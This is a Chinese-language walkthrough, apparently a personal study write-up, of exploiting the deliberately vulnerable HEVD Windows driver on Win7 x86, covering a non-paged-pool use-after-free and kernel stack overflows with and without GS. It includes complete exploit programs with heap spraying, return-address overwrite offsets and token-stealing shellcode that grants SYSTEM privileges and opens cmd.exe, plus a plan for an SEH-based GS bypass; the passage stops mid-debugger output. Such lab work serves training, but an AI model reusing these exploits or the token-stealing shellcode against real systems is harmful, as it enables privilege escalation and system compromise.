然后定义了一堆handler函数，这些函数都有两个参数Irp和IrpSp，前者为IO请求包，后者为IRP的堆栈指针。

```c++
NTSTATUS
FreeUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);
```

### UseAfterFreeNonPagedPool.h ###

重要的数据结构如下：

```c++
//
// Structures
//

typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
    FunctionPointer Callback; // 一个函数指针
    CHAR Buffer[0x54];		  // 0x54的缓冲区
} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;

typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
    CHAR Buffer[0x54 + sizeof(PVOID)]; // 预留了一个函数指针+0x54的缓冲区
} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;
```

然后定义了一些函数。

### UseAfterFreeNonPagedPool.c

定义一个全局的PUSE_AFTER_FREE_NON_PAGED_POOL类型指针，初始化为NULL。

```c
PUSE_AFTER_FREE_NON_PAGED_POOL g_UseAfterFreeObjectNonPagedPool = NULL;
```

每个之前定义的Handler函数其实都是wrapper，例如`AllocateUaFObjectNonPagedPoolIoctlHandler`调用`AllocateUaFObjectNonPagedPool()`，相当于Linux Glibc菜单pwn题的allocate函数。

```c
NTSTATUS
AllocateUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = AllocateUaFObjectNonPagedPool();

    return Status;
}
```

函数体如下：

```c
NTSTATUS
AllocateUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL; // 初始化一个局部PUSE指针为NULL

    PAGED_CODE();

    __try
    { 
        DbgPrint("[+] Allocating UaF Object\n");

        //
        // Allocate Pool chunk
        //

        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool, //非分页池，可以从任何IRQL访问，但是是稀缺资源，是可以执行。Win8开始，应该从NX非分页池分配大部分或全部非分页内存。
            sizeof(USE_AFTER_FREE_NON_PAGED_POOL), // 要分配的空间大小
            (ULONG)POOL_TAG						   // pool tag，通常是逆序
        );	// ExallocatePoolWithTag函数分配特定类型的pool内存并返回指向block的指针。

        if (!UseAfterFree) // 申请失败，报错退出
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else	// 否则打印出信息
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
        }

        //
        // Fill the buffer with ASCII 'A'
        //

        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
		// 用RtlFillMemory填充0x54的缓冲区空间为‘A’
        //
        // Null terminate the char buffer
        //

        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0'; // 最后一个填充为NULL

        //
        // Set the object Callback function
        //

        UseAfterFree->Callback = &UaFObjectCallbackNonPagedPool; //回调函数指针设置为UaFObjectCallbackNonPagedPool,这个函数没有什么实质性内容

        //
        // Assign the address of UseAfterFree to a global variable
        //

        g_UseAfterFreeObjectNonPagedPool = UseAfterFree; // 全局的指针指向当前分配的内存空间

        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

Free的如下：

```c
NTSTATUS
FreeUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool) // 如果全局的不为NULL
        {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);

#ifdef SECURE
            //
            // Secure Note: This is secure because the developer is setting
            // 'g_UseAfterFreeObjectNonPagedPool' to NULL once the Pool chunk is being freed
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);

            //
            // Set to NULL to avoid dangling pointer
            //

            g_UseAfterFreeObjectNonPagedPool = NULL;
#else
            //
            // Vulnerability Note: This is a vanilla Use After Free vulnerability
            // because the developer is not setting 'g_UseAfterFreeObjectNonPagedPool' to NULL.
            // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
            // (dangling pointer)
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
#endif

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

SECURE的宏定义下，用`ExFreePoolWithTag`free后会置为NULL，否则，不会置为NULL，所以全局的`g_UseAfterFreeObjectNonPagedPool`会成为悬挂指针。

`AllocateFakeObjectNonPagedPool`如下：

Use的如下：

```c
NTSTATUS
UseUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool) // 如果全局指针不为NULL
        {
            DbgPrint("[+] Using UaF Object\n");
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
            DbgPrint("[+] Calling Callback\n");

            if (g_UseAfterFreeObjectNonPagedPool->Callback) // 回调函数不为NULL
            {
                g_UseAfterFreeObjectNonPagedPool->Callback(); // 执行函数指针（可以劫持控制流）
            }

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

AllocateFakeObjectNonPagedPool的wrapper如下：

```c
NTSTATUS
AllocateFakeObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer; // 用参数传递一个PFAKE_OBJECT_NON_PAGED_POOL类型的变量

    if (UserFakeObject) // 如果不为NULL
    {
        Status = AllocateFakeObjectNonPagedPool(UserFakeObject); // allocate一个fake的object
    }

    return Status;
}

```

从用户态的输入copy到kernel态。

```c
NTSTATUS
AllocateFakeObjectNonPagedPool(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
) // 参数是传递进来的PFAKE_OBJECT_NON_PAGED_POOL类型的变量
{
    NTSTATUS Status = STATUS_SUCCESS;
    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Creating Fake Object\n");

        //
        // Allocate Pool chunk
        //

        KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            (ULONG)POOL_TAG
        );	// 分配一个PFAKE类型的object

        if (!KernelFakeObject) 
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
        }

        //
        // Verify if the buffer resides in user mode
        //
		// ProbeForRead函数检查用户态的缓冲区是否在地址空间中的用户部分，并且正确的对齐。
        ProbeForRead(
            (PVOID)UserFakeObject,	// 用户态的fake对象
            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            (ULONG)__alignof(UCHAR)
        );
 
        //
        // Copy the Fake structure to Pool chunk
        //
		
        // 调用RtlCopyMemory函数拷贝到KernelFakeObject，前8个字节是函数指针，后0x54个是普通字符
        RtlCopyMemory(
            (PVOID)KernelFakeObject,
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL)
        );

        //
        // Null terminate the char buffer
        //

        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';

        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

## 利用思路

首先分配一块内存到池中，包含函数指针和回调函数部分，然后释放掉这块空间，然而没有置为NULL。此时存在一个hangling指针，如果采用堆喷的手法保证能够覆盖释放掉的池内存，同时将前8个字节修改为指向shellcode的地址，最后调用use方法，执行函数指针即可！

## 编写exp

>`CreateFileA`用来创建或打开一个文件或IO设备，包括：文件、文件系统、目录、物理盘、volume、console buffer、tape drive、communication resource、masilslot和管道等。该函数返回一个句柄，根据文件或设备以及指定的标志和属性，该句柄可用于访问各种类型I/O的文件或设备。
>
>```c
>HANDLE CreateFileA(
>  LPCSTR                lpFileName,				// 文件或设备名
>  DWORD                 dwDesiredAccess,		// 请求的访问权限
>  DWORD                 dwShareMode,			// 请求的共享模式
>  LPSECURITY_ATTRIBUTES lpSecurityAttributes,	// 安全属性
>  DWORD                 dwCreationDisposition,	// 对存在或不存在的文件或设备执行的操作
>  DWORD                 dwFlagsAndAttributes,	// flag和属性
>  HANDLE                hTemplateFile			// 临时文件的句柄
>);
>```
>

打开IO设备后，调用`DeviceIoControl`即可控制驱动。

完整exp如下：

```c
#include<stdio.h>
#include<windows.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)

typedef void(*FunctionPointer)(void);

typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
	FunctionPointer Callback;
	CHAR Buffer[0x54];
} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;

void Shellcode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50] 	// 找到_PROCESS&_EPROCESS结构
		mov ecx, eax 			// ecx为当前线程
		mov edx, 4

		// 循环获取system的_EPROCESS
		find_sys_pid :
					 mov eax, [eax + 0xb8]		// 找到ActiveProcessLinks
					 sub eax, 0xb8			// FLINK
					 cmp[eax + 0xb4], edx	// 与uid = 4比较
					 jnz find_sys_pid

					 // 替换Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 ret
	}
}
static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main() {
	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("cannot open i/o device");
		return false;  
	}
	DWORD recvBuf;

	// allocate memory in non_paged pool
	DeviceIoControl(hDevice,                       // device to be queried
		HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
		NULL, 0,                       // no input buffer
		NULL, 0,
		&recvBuf,                         // # bytes returned
		NULL);          // synchronous I/O

	// free it
	DeviceIoControl(hDevice,                       // device to be queried
		HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
		NULL, 0,                       // no input buffer
		NULL, 0,
		&recvBuf,                         // # bytes returned
		NULL);          // synchronous I/O

	printf("make a fake object in pool");

	PUSE_AFTER_FREE_NON_PAGED_POOL faked = (PUSE_AFTER_FREE_NON_PAGED_POOL)malloc(sizeof(USE_AFTER_FREE_NON_PAGED_POOL));

	RtlFillMemory((PVOID)faked->Buffer, sizeof(faked->Buffer), 0x41);
	faked->Buffer[sizeof(faked->Buffer) - 1] = '\0';

	faked->Callback = &Shellcode;

	printf("heap spary!!!");
	for (int i = 0; i < 5000; ++i) {
		// free it
		DeviceIoControl(hDevice,                       // device to be queried
			HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL, // operation to perform
			faked, 0x60,                       // no input buffer
			NULL, 0,
			&recvBuf,                         // # bytes returned
			NULL);           // synchronous I/O
	}

	// free it
	DeviceIoControl(hDevice,                       // device to be queried
		HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
		NULL, 0,                       // no input buffer
		NULL, 0,
		&recvBuf,                         // # bytes returned
		NULL);          // synchronous I/O

	CreateCmd();

	return 0;
}

```

# 内核栈溢出（未开启GS）

## 漏洞驱动代码分析

### BufferOverflowStack.h

补一个小tip

>`_In_`和`_Out_`宏是空宏，并不参与编译和计算，但它对程序员起到了一个提示的作用，让我们知道如何去使用它。
>
>`_In`的实际意义是告诉你，这个变量或参数是输入值，即你必须给这个变量填写好以后提交给某个函数去执行。
>
>`_Out_`告诉你，这个变量或参数是输出值，即你不需要预先给它值，当函数执行完毕以后可以从这个变量获取输出的值。

主要做的就是定义了一个函数：

```c++
NTSTATUS
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);
```

### BufferOverflowStack.c

handler如下，将传入的buffer和长度作为参数传给漏洞函数`TriggerBufferOverflowStack`。

```c++
/// <summary>
/// Buffer Overflow Stack Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }

    return Status;
}
```

在`TriggerBufferOverflowStack`的函数题前面有相应的注解:

```
__declspec(safebuffers);
```

查询微软官方文档：

>The **/GS** compiler option causes the compiler to test for buffer overruns by inserting security checks on the stack. The types of data structures that are eligible for security checks are described in [/GS (Buffer Security Check)](https://docs.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=vs-2019). For more information about buffer overrun detection, see [Security Features in MSVC](https://blogs.msdn.microsoft.com/vcblog/2017/06/28/security-features-in-microsoft-visual-c/).
>
>An expert manual code review or external analysis might determine that a function is safe from a buffer overrun. In that case, you can suppress security checks for a function by applying the **__declspec(safebuffers)** keyword to the function declaration.

这个关键字可以告知编译器不要插入针对此函数的GS检查。

`KernelBuffer`的定义如下，512个ULONG，而x86中一个ULONG是4个字节，所以缓冲区为0x800个字节大小。

```c++
#define BUFFER_SIZE 512
ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
```

缓冲区的长度为512，但拷贝的时候没有检查，直接拷贝，可能溢出kernel缓冲区。

```c++
 		ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));

#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
```

## 利用思路

栈溢出的利用，基于我们在Linux环境下的经验，主要就是基于不同的防护机制采用不同的绕过方法。由于我们这次练习使用的是Win7 x86环境，没有开启SMEP，而又没开启GS（canary），所以直接`return to user mode's shellcode`即可！

主要的难点就是确定栈帧中存储的返回地址离我们可控制的缓冲区的偏移。我们先逆向看一下，确定下断点的位置。

漏洞函数的f5代码如下：

```c
int __stdcall TriggerBufferOverflowStack(void *UserBuffer, unsigned int Size)
{
  unsigned int KernelBuffer[512]; // [esp+10h] [ebp-828h]
  int v4; // [esp+814h] [ebp-24h]
  BOOL v5; // [esp+818h] [ebp-20h]
  int Status; // [esp+81Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+820h] [ebp-18h]

  Status = 0;
  KernelBuffer[0] = 0;
  memset(&KernelBuffer[1], 0, 0x7FCu);
  v5 = (signed int)(unsigned __int8)KeGetCurrentIrql() > 1;
  if ( v5 )
    NT_ASSERT("KeGetCurrentIrql() <= 1");
  v4 = 1;
  ms_exc.registration.TryLevel = 0;
  ProbeForRead(UserBuffer, 0x800u, 1u);
  _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
  _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%X\n", Size);
  _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", KernelBuffer);
  _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 2048);
  _DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack\n");
  memcpy(KernelBuffer, UserBuffer, Size);
  return Status;
}
```

我们直接将断点下到`TriggerBufferOverflowStack`即可。

```
2: kd> bp HEVD!TriggerBufferOverflowStack
2: kd> bl
     0 e Disable Clear  a5edd6b0     0001 (0001) HEVD!TriggerBufferOverflowStack
```

然后continue，断到断点处

```
1: kd> kp
 # ChildEBP RetAddr  
00 916f3ab0 a5edd696 HEVD!TriggerBufferOverflowStack(void * UserBuffer = 0x0016f334, unsigned long Size = 0x800)+0x119 
01 916f3ad4 a5eddeac HEVD!BufferOverflowStackIoctlHandler(struct _IRP * Irp = 0x88bab550, struct _IO_STACK_LOCATION * IrpSp = 0x88bab5c0 IRP_MJ_DEVICE_CONTROL / 0x0 for {...})+0x76
02 916f3afc 83e78593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x86ad3f08 Device for "\Driver\HEVD", struct _IRP * Irp = 0x88bab550)+0xbc 
03 916f3b14 8406c99f nt!IofCallDriver+0x63
04 916f3b34 8406fb71 nt!IopSynchronousServiceTail+0x1f8
05 916f3bd0 840b63f4 nt!IopXxxControlFile+0x6aa
06 916f3c04 83e7f1ea nt!NtDeviceIoControlFile+0x2a
07 916f3c04 774670b4 nt!KiFastCallEntry+0x12a
08 0016f274 77465864 ntdll!KiFastSystemCallRet
09 0016f278 7582989d ntdll!ZwDeviceIoControlFile+0xc
0a 0016f2d8 772ba671 KernelBase!DeviceIoControl+0xf6
0b 0016f304 013a10ce kernel32!DeviceIoControlImplementation+0x80
WARNING: Frame IP not in any known module. Following frames may be wrong.
0c 0016fb38 013a12a7 0x13a10ce
0d 0016fb80 772c3c45 0x13a12a7
0e 0016fb8c 774837f5 kernel32!BaseThreadInitThunk+0xe
0f 0016fbcc 774837c8 ntdll!__RtlUserThreadStart+0x70
10 0016fbe4 00000000 ntdll!_RtlUserThreadStart+0x1b

```

从缓冲区开始我们查找相应的地址，所以偏移为0x830

```
1: kd> dd KernelBuffer+0x800
916f3a88  00000000 00000001 00000000 00000000
916f3a98  916f3278 00000302 916f3bc0 a5e990d0
916f3aa8  4e66d44e 00000000 916f3ad4 a5edd696 // 返回地址
916f3ab8  0016f334 00000800 00000001 c0000001
916f3ac8  00000800 00000000 0016f334 916f3afc
916f3ad8  a5eddeac 88bab550 88bab5c0 00000001
916f3ae8  00000000 00222003 00000000 c00000bb
916f3af8  88bab5c0 916f3b14 83e78593 86ad3f08


```

但我们的shellcode将`HEVD!TriggerBufferOverflowStack`的返回地址覆盖为提权函数地址，saved_ebp相应被覆盖为`aaaa`。所以在`HEVD!TriggerBufferOverflowStack`返回后会执行shellcode，而此时ebp被破坏。而在shellcode结束的时候我们应该正常返回到`HEVD!IrpDeviceIoCtlHandler`，所以我们手动平衡堆栈即可（移动堆栈，修改ebp为0x916f3afc，再ret时候再平衡即可）。

## 完成exp

```c++
#include<stdio.h>
#include<windows.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)

typedef void(*FunctionPointer)(void);

void Shellcode()
{
	//__debugbreak();
	_asm
	{
		nop
		pushad
		mov eax, fs:[124h]		
		mov eax, [eax + 0x50] 	
		mov ecx, eax 			
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0xb8]		
					 sub eax, 0xb8			
					 cmp[eax + 0xb4], edx	
					 jnz find_sys_pid

					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 add esp, 0x20
					 pop ebp
					 ret 8
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main() {
	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("cannot open i/o device");
		return false;
	}
	DWORD recvBuf;
	CHAR shellcode[0x830]; // 这里并没有确保shellcode在可读可写可执行的页中
	RtlFillMemory((PVOID)shellcode, sizeof(shellcode)-0x4, 0x41);
	*(PDWORD)(shellcode + 0x82c) = (DWORD)&Shellcode;
	// allocate memory in non_paged pool
	DeviceIoControl(hDevice,                       // device to be queried
		HEVD_IOCTL_BUFFER_OVERFLOW_STACK, // operation to perform
		shellcode, sizeof(shellcode),              
		NULL, 0,
		&recvBuf,                         // # bytes returned
		NULL);          // synchronous I/O
	
	CreateCmd();
	return 0;
}
```

# 内核栈溢出（开启GS）

## 漏洞驱动代码分析 ##

和不开启GS的代码相同，只不过没有关闭GS的宏定义。

## 利用思路

GS实际上就是Canary，绕过GS的方法如下：

>- 通过覆盖SEH链表来阻止系统接管异常处理
>- 通过改写C++虚表指针来控制程序流程 # msvcrt采用进程堆以后失效
>- 用一些未开启GS安全保护的函数进行溢出（关键字保护或小于四字节的缓冲区）

这里学到了一个小tip

可以用windbg查询驱动的ioctl派遣函数：

```
3: kd> !drvobj hevd 2
Driver object (880cf808) is for:
 \Driver\HEVD
DriverEntry:   98b6f19c	HEVD!GsDriverEntry
DriverStartIo: 00000000	
DriverUnload:  98b69cf0	HEVD!DriverUnloadHandler
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      98b69d80	HEVD!IrpCreateCloseHandler
[01] IRP_MJ_CREATE_NAMED_PIPE           98b6a5f0	HEVD!IrpNotImplementedHandler
[02] IRP_MJ_CLOSE                       98b69d80	HEVD!IrpCreateCloseHandler
[03] IRP_MJ_READ                        98b6a5f0	HEVD!IrpNotImplementedHandler
[04] IRP_MJ_WRITE                       98b6a5f0	HEVD!IrpNotImplementedHandler
[05] IRP_MJ_QUERY_INFORMATION           98b6a5f0	HEVD!IrpNotImplementedHandler
[06] IRP_MJ_SET_INFORMATION             98b6a5f0	HEVD!IrpNotImplementedHandler
[07] IRP_MJ_QUERY_EA                    98b6a5f0	HEVD!IrpNotImplementedHandler
[08] IRP_MJ_SET_EA                      98b6a5f0	HEVD!IrpNotImplementedHandler
[09] IRP_MJ_FLUSH_BUFFERS               98b6a5f0	HEVD!IrpNotImplementedHandler
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    98b6a5f0	HEVD!IrpNotImplementedHandler
[0b] IRP_MJ_SET_VOLUME_INFORMATION      98b6a5f0	HEVD!IrpNotImplementedHandler
[0c] IRP_MJ_DIRECTORY_CONTROL           98b6a5f0	HEVD!IrpNotImplementedHandler
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         98b6a5f0	HEVD!IrpNotImplementedHandler
[0e] IRP_MJ_DEVICE_CONTROL              98b69df0	HEVD!IrpDeviceIoCtlHandler
[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     98b6a5f0	HEVD!IrpNotImplementedHandler
[10] IRP_MJ_SHUTDOWN                    98b6a5f0	HEVD!IrpNotImplementedHandler
[11] IRP_MJ_LOCK_CONTROL                98b6a5f0	HEVD!IrpNotImplementedHandler
[12] IRP_MJ_CLEANUP                     98b6a5f0	HEVD!IrpNotImplementedHandler
[13] IRP_MJ_CREATE_MAILSLOT             98b6a5f0	HEVD!IrpNotImplementedHandler
[14] IRP_MJ_QUERY_SECURITY              98b6a5f0	HEVD!IrpNotImplementedHandler
[15] IRP_MJ_SET_SECURITY                98b6a5f0	HEVD!IrpNotImplementedHandler
[16] IRP_MJ_POWER                       98b6a5f0	HEVD!IrpNotImplementedHandler
[17] IRP_MJ_SYSTEM_CONTROL              98b6a5f0	HEVD!IrpNotImplementedHandler
[18] IRP_MJ_DEVICE_CHANGE               98b6a5f0	HEVD!IrpNotImplementedHandler
[19] IRP_MJ_QUERY_QUOTA                 98b6a5f0	HEVD!IrpNotImplementedHandler
[1a] IRP_MJ_SET_QUOTA                   98b6a5f0	HEVD!IrpNotImplementedHandler
[1b] IRP_MJ_PNP                         98b6a5f0	HEVD!IrpNotImplementedHandler

```

这里我们的利用思路如下：

- 首先分配一块可读可写可执行的内存页来放置我们的shellcode（或者直接写到text段作为用户态函数也行）
- 将shellcode拷贝到可执行的内存页中
- 因为开启了GS，所以不能直接覆盖返回地址，我们选择覆盖栈帧中的SEH地址并且触发kernel中的异常，所以SEH会执行我们的payload。
- 为此，我们创建一个文件映射对象（File Mapping Object）并且将它映射到利用进程的地址空间
- 将我们的userbuffer放在文件映射对象的最后并且复写SEH指向shellcode。
- 调用DeviceIoControl函数与设备交互，发送UserBuffer到内核空间的驱动，并且发送4个额外的字节超过文件映射对象/UserBuffer
- 4个额外字节会在从userbuffer拷贝到内核态时导致异常，因为这4个字节处于未分配的内存中，并且将会造成访问违规。
- The Access Violation将会触发SEH链。

这里为了测试SEH的偏移，我们用`cyclic`模式串调试一下，

```
0: kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

UNEXPECTED_KERNEL_MODE_TRAP (7f)
This means a trap occurred in kernel mode, and it's a trap of a kind
that the kernel isn't allowed to have/catch (bound trap) or that
is always instant death (double fault).  The first number in the
bugcheck params is the number of the trap (8 = double fault, etc)
Consult an Intel x86 family manual to learn more about what these
